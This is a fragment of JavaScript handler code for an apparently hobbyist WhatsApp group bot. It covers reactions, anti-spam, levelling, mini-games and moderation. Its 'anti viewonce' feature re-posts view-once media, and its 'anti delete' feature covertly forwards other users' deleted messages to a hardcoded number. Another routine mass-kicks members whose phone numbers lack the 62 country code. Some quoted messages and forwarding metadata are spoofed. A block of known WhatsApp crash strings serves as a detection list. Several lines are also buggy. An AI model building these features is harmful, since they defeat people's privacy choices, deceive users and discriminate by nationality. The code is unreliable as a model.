    // Define all relevant message types, including special cases
    const isRelevantMessage = 
        isCmd || 
        isText || 
        isImage || 
        isVideo || 
        isSticker || 
        isAudio || 
        isMedia || 
        isViewOnce || 
        isQuotedImage || 
        isQuotedVideo || 
        isQuotedSticker || 
        isQuotedAudio || 
        isQuotedText || 
        isQuotedTag || 
        isQuotedReply || 
        isQuotedViewOnce;

    if (isRelevantMessage) {
        const emojis = [
            "😀", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
            "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
            "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
            "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
            "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
            "🤪", "😡", "😠", "🤬", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
            "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
            "👿", "👹", "👺", "💀", "👻", "👽", "👾", "🤖", "🎃", "😺",
            "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
            "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
        ];

        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

        try {
            await conn.sendMessage(m.chat, {
                react: {
                    text: randomEmoji,
                    key: m.key,
                },
            });
        } catch (err) {
            console.error('Error while reacting:', err.message);
        }
    }
}














// Public & Self And Banchat
if (!publik && !itsMe && !isOwner && !theOwner) return 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}
 // Mute Chat grub
if(isGroup){
let mut = db.data.chats[m.chat].mute
if (mut && !isGroupAdmins && !isOwner && !isGroupOwner) {
return
}      
}



const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  conn.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  conn.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: dev})
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendGif = (teks, teksnya) => {
conn.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: dev})
};        

//FUNCTION ONLY
/*/Bot tidak bisa di akses di pc kecuali premium
if(!isGroup && !isPremium && isCmd) {
let teks = `Kamu bukan user premium
silahkan upgrade ke premium agar bisa menggunakan 
bot secara private chat\n\n${sgc}
`
return conn.sendMessage(from,{text: teks})
}*/
//user pc

//AUTO BLOCK CMD
for (let i = 0; i < listcmdblock.length ; i++) {
if (command === listcmdblock[i].cmd ){
if(autoblockcmd) {
return setReply(mess.block.Bsystem)
} else{
return setReply(mess.block.Bowner)
}
}
}

//FITUR USER PREMIUM
if(!checkDataName("premium", "", DataId)) { 
await createDataId("premium", DataId) 
}
let userPremium =  DataId.filter(item => item.name == "premium" )
for(let i of userPremium[0].id){
if(command == i && !isPremium) return setReply(`𝚃𝙷𝙸𝚂 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙸𝚂 𝙾𝙽𝙻𝚈 𝙵𝙾𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝚄𝚂𝙴𝚁𝚂`)
}

//ONLY OWNER COMMAND

// Main logic for handling owner-only commands
if (!checkDataName("commands", "", DataId)) { 
    await createDataId("commands", DataId); 
}

let ownerCommands = DataId.filter(item => item.name == "commands");
for (let i of ownerCommands[0].id) {
    if (command == i && !isOwner) {
        // If the command is owner-only and the user isn't the owner, trigger the onlyOwner function
        return await onlyOwner();
    }
}



//××××××××××××××××{××××//
const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}
//System Expired
_sewa.expiredCheck(conn, sewa)
_prem.expiredCheck(premium) 
//autoClearChat(conn,clearchat)
  
//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Successfully removed spammer")
}
}


SpamExpired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")),"antispam Case Active")
return
}

// ANTI-SPAM FOR PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner) {
    addSpam("Case", senderNumber, "5s", AntiSpam);
    addSpammer(senderNumber, spammer);
    return setReply("🛑 𝗦𝗧𝗢𝗣 𝗦𝗣𝗔𝗠𝗠𝗜𝗡𝗚 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦! 🛑");
}

// ANTI-SPAM FOR GROUP CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
    addSpam("Case", senderNumber, "10s", AntiSpam);
    addSpammer(senderNumber, spammer);
    return setReply("🛑 𝗦𝗧𝗢𝗣 𝗦𝗣𝗔𝗠𝗠𝗜𝗡𝗚 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦! 🛑");
}
if (isCmd && !isOwner) msgFilter.addFilter(from)

//Auto level users
if(user && isCmd && userExp >= requiredExp){
//const { userXp, userLeveling, } = (await import("../lib/user.js"))
let link = 'https://telegra.ph/file/9528a0b81d1b46bdb5507.jpg'
let level = userLevel+1
let uang = 1000*level

db.data.users[m,sender].exp = userExp - requiredExp
db.data.users[m.sender].level += 1
db.data.users[m.sender].money += 1000*level
//db.data,user[m.sender].grade = userLeveling(`${db.data.users[sender].level + 1}`)

let contextInfo = {
externalAdReply : {
showAdAttribution: false,
mediaType: 1,
title: 'Exp',
thumbnailUrl: link,
renderLargerThumbnail: true,
mediaUrl: 'https://chat.whatsapp.com/GsX10XuzZqQ99jccdcDasi',
sourceId: botName,
sourceUrl: 'https://chat.whatsapp.com/GsX10XuzZqQ99jccdcDasi'
}
}
let mentions = [sender]
let text = Ehztext(`◪ *Nama:* ${pushname}
├◆ *Pangkat:* ${userLeveling(`${db.data.users[sender].level + 1}`)}
├◆ *Saldo:* + Rp ${uang.toLocaleString()}
╰◆ *Level:*  ${userLevel} ➠ ${userLevel + 1}

*Note:* ↓
Gunakan saldo untuk membeli limit tambahan
dengan fitur ${prefix}buylimit`)
//conn.sendMessage(from,{contextInfo, text,mentions})
  setReply(text)
}

// AUTO RESPON VIDEO
if (videonya.includes(messagesC)) {
  let namastc = messagesC;
  let buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`); // Ubah ekstensi dan jalur ke video
  conn.sendMessage(from, { video: buffer }, { quoted: dev });
}

//AUTO RESPON IMAGE
if(imagenya.includes(messagesC)){
let namastc = messagesC
let buffer = fs.readFileSync(`./temp/image/${namastc}.jpg`)
conn.sendMessage(from, {image: buffer}, {quoted:dev })
}
//Auto Sticker Online
if(db.data.sticker[budy]){ 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "5s", AntiSpam)
conn.sendMessage(from,{sticker:{url:db.data.sticker[budy].link}}, {quoted: dev})
}
//Auto VN Online  
if(db.data.audio[budy]) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
 let nono =  {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${db.data.audio[budy].name}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const iniQuoted = mentionByReply? m.quoted.fakeObj : nono 
conn.sendMessage(from, {audio: {url: db.data.audio[budy].link},ptt: true, mimetype: 'audio/mpeg'}, {quoted: iniQuoted }) 
addSpam("NotCase",senderNumber, "5s", AntiSpam)
}




//onlyOwner
// Define the onlyOwner function
const onlyOwner = async () => {
    // Prepare the message text
    const teks = `𝙃𝙚𝙮, ${pushname}!\nThis command is restricted to the *Owner* of the bot.`;

    const contextInfo = {
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName,
        },
        externalAdReply: {
            showAdAttribution: true,
            title: '❌ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 ❌',
            body: '𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳',
            previewType: "PHOTO",
            thumbnailUrl:"https://pomf2.lain.la/f/dbogd7ch.jpg",
            sourceUrl: 'https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K'
        }
    };

    // Send the message
    await conn.sendMessage(
        from,
        {
            contextInfo,
            text: `${teks}\n${readmore}\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺${calender}`,
        },
        { quoted: ftoko }
    );
};





  //onlyAdmin
  const onlyBadmin = async () => {
    // Prepare the message text
    let teks = `𝙃𝙚𝙡𝙡𝙤, ${pushname}!\nPlease make ${botName} an *Admin* to use this command.`;
    let contextInfo = {
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName,
        },
        externalAdReply: {
            showAdAttribution: true,
            title: '❌ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 ❌',
            body: '𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳',
            previewType: "PHOTO",
            thumbnailUrl:"https://pomf2.lain.la/f/dbogd7ch.jpg",
            sourceUrl: 'https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K'
        }
    };

    // Send the message
    await conn.sendMessage(
        from,
        {
            contextInfo,
            text: `${teks}\n${readmore}\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${calender}`,
        },
        { quoted: ftoko }
    );
};






  //onlyPremium
  const onlyPremium = async () => {
    // Prepare the message text with a cool font
    let teks = `𝙃𝙚𝙡𝙡𝙤, ${pushname}!\nThis command is available only for *Premium Users*. Please upgrade to Premium to access this feature.`;

    let contextInfo = {
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
            newsletterJid,
            serverMessageId: 100,
            newsletterName,
        },
        externalAdReply: {
            showAdAttribution: true,
            title: '❌ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃 ❌',
            body: '𝙳𝚁𝙰𝙲𝚄𝙻𝙰 𝙼𝙳',
            previewType: "PHOTO",
            thumbnailUrl:"https://pomf2.lain.la/f/dbogd7ch.jpg",
            sourceUrl: 'https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K'
        }
    };

    // Send the message
    await conn.sendMessage(
        from,
        {
            contextInfo,
            text: `${teks}\n${readmore}\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺${calender}`,
        },
        { quoted: ftoko }
    );
};
  //onlyGroup
  let teks = Ehztext(`👋 *Hᴇʟʟᴏ ${pushname}!* 

❗ *Tʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ᴏɴʟʏ ᴀʟʟᴏᴡᴇᴅ ɪɴ ɢʀᴏᴜᴘs*`)
  const onlyGroup = async() =>{
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid,
          serverMessageId: 100,
          newsletterName
          },
      externalAdReply: {
      showAdAttribution: true,
      title: 'Aᴄᴄᴇss Dᴇnɪᴇd ❌',
      body:'',
      previewType:"PHOTO",
      thumbnailUrl:"https://pomf2.lain.la/f/dbogd7ch.jpg",
      sourceUrl:'https://whatsapp.com/channel/0029Vap32qXLikg91i4TmH3K'
      }
      }

      conn.sendMessage(from, { contextInfo, text: `${teks}\n`+readmore+`\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${calender}`}, { quoted: ftoko })
      }
      
      
      
  
// SendAnti
  const sendAnti = (teks) => {
  let contextInfo = {
  mentionedJid: [sender],
  externalAdReply: {
  showAdAttribution: true,
  title: `${botName}`,
  body: `Wagwan 🥶 ${pushname}`,
  previewType:"PHOTO",
  thumbnailUrl:"https://pomf2.lain.la/f/dbogd7ch.jpg",
  sourceUrl: `${sgc}`
  }
  }

  conn.sendMessage(from, { contextInfo, text: `${teks}\n`+readmore+`\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${calender}`}, { quoted: fkontak })
  }
//AUTO BIO BOT
if(settings){
} else global.db.data.settings['settingbot'] = { status: new Date() * 1, }
if ((new Date() * 1 - settings.status > 2000) && settings && settings.autoBio) {
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime)  
let bio = `${botName} 🤖 || ⏰ Runtime ${clockString(time)} || 🌎 Mode: ${publik? 'Public' : 'self'} || 🎨 Created By ${ownerName}`
await conn.updateProfileStatus(bio).catch(_ => _)
settings.status = new Date() * 1
}
 // Function Loading 
async function loading () {
let emotLoad = ["🥶"]
 await conn.sendMessage(from, { react: { text: emotLoad, key: m.key } })
}
async function loadingerror () {
let emotLoaderr = ["❌"]
 await conn.sendMessage(from, { react: { text: emotLoaderr, key: m.key } })
}
//FUNCTION AREA ===============

//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
}

  
//-------------------- 》SECURITY《 ------------------\\
//ANTI VIEWONCE 
if ((type == 'viewOnceMessage' || isQuotedViewOnce) && (isAntiViewOnce || budy.startsWith("Readviewonce")))  {
const { downloadContentFromMessage } = (await import('@whiskeysockets/baileys')).default
if(isQuotedViewOnce){
var view = m.quoted.message
} else {
var view = m.message.viewOnceMessage.message
} 

let Type = Object.keys(view)[0]
let media = await downloadContentFromMessage(view[Type], Type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(Type)) {
conn.sendFile(m.chat, buffer, 'media.mp4', view[Type].caption || '', m)
} else if (/image/.test(Type)) {
conn.sendFile(m.chat, buffer, 'media.jpg', view[Type].caption || '', m)
}
}
// ANTI BOT
    if (isGroup && isAntiBot) {
    if (m.isBaileys && m.fromMe == false){
        if (!isBotGroupAdmins){		  
        } else {
          sendAnti(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
  }
// ANTI IMAGE
if (isGroup && isAntiImage && isHanMedia) {
    if (isHanMedia === "imageMessage") {
        if (isGroupAdmins) return setReply('🚫 Admin privilege detected! You can send images freely, mate.');
        if (!isBotGroupAdmins) {
            // Do nothing if bot is not admin
        } else {
            sendAnti(`*⛔「 IMAGE DETECTED 」⛔*\n\nSorry, I removed it because the admin/owner has enabled the Anti-Image feature in this group.`);
            return conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
        }
    }
}

// ANTI VIDEO
if (isGroup && isAntiVideo && isHanMedia) {
    if (isHanMedia === "videoMessage") {
        if (!isBotGroupAdmins) {
            // Do nothing if bot is not admin
        } else {
            sendAnti(`*⛔「 VIDEO DETECTED 」⛔*\n\nSorry, I removed it because the admin/owner has enabled the Anti-Video feature in this group.`);
            return conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
        }
    }
}

// ANTI STICKER 
if (isGroup && isAntiSticker && isHanMedia) {
    if (isHanMedia === "stickerMessage") {
        if (!isBotGroupAdmins) {
            // Do nothing if bot is not admin
        } else {
            sendAnti(`*⛔「 STICKER DETECTED 」⛔*\n\nSorry, I removed it because the admin/owner has enabled the Anti-Sticker feature in this group.`);
            return conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
        }
    }
}

// ANTI AUDIO
if (isGroup && isAntiAudio && isHanMedia) {
    if (isHanMedia === "audioMessage") {
        if (!isBotGroupAdmins) {
            // Do nothing if bot is not admin
        } else {
            sendAnti(`*⛔「 AUDIO DETECTED 」⛔*\n\nSorry, I removed it because the admin/owner has enabled the Anti-Audio feature in this group.`);
            return conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});
        }
    }
}

// ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
    if (isGroupAdmins) return setReply('🚫 Admin privilege detected! You can send group links freely.');
    if (!isBotGroupAdmins) return reply('⚠️ Bot is not an admin, unable to delete the message.');
    if (ownerNumber.includes(sender)) return setReply('🚫 Owner privilege detected! You can send group links freely.');
    let linkgc = await conn.groupInviteCode(from);
    if (budy.includes(`${linkgc}`)) return reply('😅 Phew, thought it was another group link! Close call.');
    await setReply(`*⛔「 GROUP LINK DETECTED 」⛔*\nYou sent a group link. Sorry, I removed it because Anti-Link is active.`);
    await sleep(2000);
    if (isBotGroupAdmins) await conn.sendMessage(from, { delete: m.key });
    conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => {
        setReply(`⚠️ Unable to remove @${sender} because the bot is not an admin.`);
    });
}

// Auto kick marked users
if (kickon) {
    if (isGroup && kickon.includes(sender)) {
        let teks = `🚷 User @${senderNumber} is not allowed in this group as they were previously removed and marked as problematic.`;
        await conn.sendMessage(from, { text: teks, contextInfo: { mentionedJid: [sender] } }, { quoted: dev });
        if (!isBotGroupAdmins) return conn.sendMessage(from, { text: `⚠️ Unable to remove @${sender} because the bot is not an admin.`, contextInfo: { mentionedJid: [sender] } }, { quoted: dev });
        if (isBotGroupAdmins) conn.groupParticipantsUpdate(from, [sender], 'remove');
    }
}

  
 
  
 //ANTI LINK 
if (isGroup && isAntiLink) {
    if (budy.includes(`https:`)) { 
        if (isGroupAdmins) return setReply('𝔜𝔬𝔲’𝔯𝔢 𝔞𝔫 𝔞𝔡𝔪𝔦𝔫, 𝔣𝔯𝔢𝔢 𝔭𝔞𝔰𝔰 𝔤𝔦𝔳𝔢𝔫! 😎')
        if (ownerNumber.includes(sender)) return setReply('𝔒𝔴𝔫𝔢𝔯 𝔭𝔯𝔦𝔳𝔦𝔩𝔢𝔤𝔢𝔰 𝔞𝔠𝔱𝔦𝔳𝔞𝔱𝔢𝔡! 😌')
        let linkgc = await conn.groupInviteCode(from)
        if (budy.includes(`${linkgc}`)) return reply('ℍ𝕒𝕙! 𝕋𝕙𝕠𝕦𝕘𝕙𝕥 𝕚𝕥 𝕨𝕒𝕤 𝕒 𝕕𝕚𝕗𝕗𝕖𝕣𝕖𝕟𝕥 𝕘𝕣𝕠𝕦𝕡 𝕝𝕚𝕟𝕜... 𝔸𝕝𝕞𝕠𝕤𝕥 𝕘𝕠𝕥 𝕜𝕚𝕔𝕜𝕖𝕕! 😆')
        if (budy.includes('zin admin') || budy.includes('zinmin')) return setReply('ℙ𝕖𝕣𝕞𝕚𝕤𝕤𝕚𝕠𝕟 𝕗𝕣𝕠𝕞 𝕒𝕕𝕞𝕚𝕟 𝕘𝕣𝕒𝕟𝕥𝕖𝕕.')
        setReply(`*『 𝕃𝕀ℕ𝕂 𝔻𝔼𝕋𝔼ℂ𝕋𝔼𝔻 』*\n𝕐𝕠𝕦 𝕤𝕖𝕟𝕥 𝕒 𝕝𝕚𝕟𝕜, 𝕤𝕠𝕣𝕣𝕪, 𝕪𝕠𝕦'𝕣𝕖 𝕘𝕠𝕟𝕖 𝕗𝕣𝕠𝕞 𝕥𝕙𝕖 𝕘𝕣𝕠𝕦𝕡. 🫣`)
        setTimeout(() => {
            if (isBotGroupAdmins) conn.sendMessage(from, { delete: m.key })
            conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { 
                setReply(`𝔹𝕆𝕋 𝕄𝕌𝕊𝕋 𝔹𝔼 𝔸ℕ 𝔸𝔻𝕄𝕀ℕ!`) 
            })
        }, 2000)
    }
}

 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins &&isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.id)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.id == member[i]) 
if (!usersId.groupAdmins ){
await conn.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
} 
}  

//ANTI VIRUS
if (isGroup && isAntiVirtex) {
    if (
        budy.includes('๒๒๒๒') || 
        budy.includes('ดุ') || 
        budy.includes('ผิดุท้เึางืผิดุท้เึางื') || 
        budy.includes('๑๑๑๑๑๑๑๑') || 
        budy.includes('৭৭৭৭৭৭৭৭') || 
        budy.includes('   ⃢   ⃢   ⃢  ') || 
        budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || 
        budy.includes('ผดิทุเ้ึางผืดิทุเ้') || 
        budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || 
        budy.includes('᥋') || 
        budy.includes('؁') || 
        budy.includes('ٯٯٯٯٯ')
    ) {
        if (isGroupAdmins) return setReply('*𝕍𝕀ℝ𝕋𝔼𝕏 𝔻𝔼𝕋𝔼ℂ𝕋𝔼𝔻*\n(𝔹𝕦𝕥 𝕪𝕠𝕦’𝕣𝕖 𝕒𝕟 𝕒𝕕𝕞𝕚𝕟, 𝕤𝕠 𝕗𝕣𝕖𝕖 𝕡𝕒𝕤𝕤! 😉)')
        console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
        conn.sendMessage(m.chat, `*𝕄𝔸ℝ𝕂 𝔸𝕊 ℝ𝔼𝔸𝔻*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝔼𝕏ℙ𝕆𝕊𝔼𝔻! ℍ𝕖𝕣𝕖'𝕤 𝕨𝕙𝕠 𝕤𝕖𝕟𝕥 𝕥𝕙𝕖 𝕧𝕚𝕣𝕥𝕖𝕩:\n𝕔𝕙𝕖𝕔𝕜 𝕥𝕙𝕖𝕚𝕣 𝕔𝕠𝕟𝕥𝕒𝕔𝕥 → wa.me/${sender.split("@")[0]}`)
        
        if (!isBotGroupAdmins) {
            return setReply('ℍ𝔼𝕐! 𝕋𝕙𝕖 𝕓𝕠𝕥 𝕞𝕦𝕤𝕥 𝕓𝕖 𝕒𝕟 𝕒𝕕𝕞𝕚𝕟 𝕥𝕠 𝕙𝕒𝕟𝕕𝕝𝕖 𝕥𝕙𝕚𝕤! 🚫')
        }
        if (isOwner) return
        await conn.groupParticipantsUpdate(from, [sender], 'remove')
        conn.sendMessage(from, { delete: m.key })
        await conn.sendMessage(`${nomerOwner}@s.whatsapp.net`, {
            text: `*ℍ𝕚 𝕆𝕨𝕟𝕖𝕣!*\n\n🔍 𝕊𝕠𝕞𝕖𝕠𝕟𝕖 𝕛𝕦𝕤𝕥 𝕤𝕖𝕟𝕥 𝕒 𝕧𝕚𝕣𝕥𝕖𝕩:\n👉 wa.me/${sender.split("@")[0]} \n${isGroup ? `𝕀𝕟 𝔾𝕣𝕠𝕦𝕡: ${groupName}` : ''}`
        })
    }
}
 
 
 //ANTI WA.ME
if (isGroup && isAntiWame) {
if (budy.includes('https://wa.me') || budy.includes('wa.me') || budy.includes('Https://wa.me') || budy.includes('Wa.me') ) {
if (!isBotGroupAdmins) {return}
setReply (`*LINK WA ME TERDETEKSI*\n\nMaaf bot akan menghapus link tersebut!!,\n\nhubungi Admin  untuk mematikan fitur anti wame`)
conn.sendMessage(from, { delete: m.key })
 }
 }
  
// ANTI TOXIC

  global.antidelete = true; // or false, depending on the desired default state
   
    
// ANTI DELETE
if (type === "protocolMessage" && global.antidelete) {
    let mess = chatUpdate.messages[0]?.message?.protocolMessage;

    try {
        // Replace "your_number@s.whatsapp.net" with your actual JID
        const yourJID = "2349060853189@s.whatsapp.net";

        // Find the deleted message in chat history
        let chats = Object.entries(await conn.chats).find(([user, data]) =>
            data.messages && data.messages[mess.key.id]
        );

        if (chats && chats[1] !== undefined) {
            // Retrieve the deleted message
            let deletedMessage = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]));

            // Determine the type of the deleted message
            let messageType = Object.keys(deletedMessage.message || {})[0];
            let messageTypeText = {
                imageMessage: "Image",
                videoMessage: "Video",
                stickerMessage: "Sticker",
                documentMessage: "Document",
                audioMessage: "Audio",
                contactMessage: "Contact",
                locationMessage: "Location",
                liveLocationMessage: "Live Location",
                conversation: "Text",
            }[messageType] || "Unknown";

            // Prepare alert message
            let alertMessage =
                "🛑 *Deleted Message Detected*\n\n" +
                `📍 *Chat/Group Name:* ${chats[1]?.metadata?.subject || "Private Chat"}\n` +
                `👤 *Sender:* ${deletedMessage.pushName || "Unknown"}\n` +
                `> *Type:* ${messageTypeText}`;

            // Send alert message to your DM
            await conn.sendMessage(yourJID, { text: alertMessage });

            // Resend the deleted message to your DM
            await conn.copyNForward(yourJID, deletedMessage).catch(e => console.error(e, deletedMessage));
        }
    } catch (error) {
        console.error("Error handling anti-delete:", error);
    }
}
    
  //====================================//






       
  

  


//GAME MATH FUNCTION
conn.math = conn.math ? conn.math : {}
if(isGroup && from in conn.math){
if(!isGroup) {return} 
//console.log(conn.math)
try{
let id = from
if (!(id in conn.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
let math = JSON.parse(JSON.stringify(conn.math[id][1]))
if (budy == math.result) {
user.balance += math.bonus
clearTimeout(conn.math[id][3])
delete conn.math[id]
await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
} else { 
  /*
if (--conn.math[id][2] == 0) {
clearTimeout(conn.math[id][3])
delete conn.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${conn.math[id][2]} kesempatan`)
}
*/
}
}catch(err){
console.log(err)
}
}

//GAME  teka teki Function
conn.tekateki = conn.tekateki ? conn.tekateki : {}  
if(isGroup && from in conn.tekateki){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.tekateki[id][2]
 var teks1 = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tekateki[id][2]} Money 💸`
 reply(teks1)
 clearTimeout(conn.tekateki[id][3])
 delete conn.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}


  //GAME Susunkata Function
conn.susunkata = conn.susunkata ? conn.susunkata : {}  
if(isGroup && from in conn.susunkata){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(conn.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
user.balance += conn.susunkata[id][2]
   var teks2 = `*GAME SUSUN KATA*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.susunkata[id][2]} Money 💸`
reply(teks2)
 clearTimeout(conn.susunkata[id][3])
 delete conn.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}


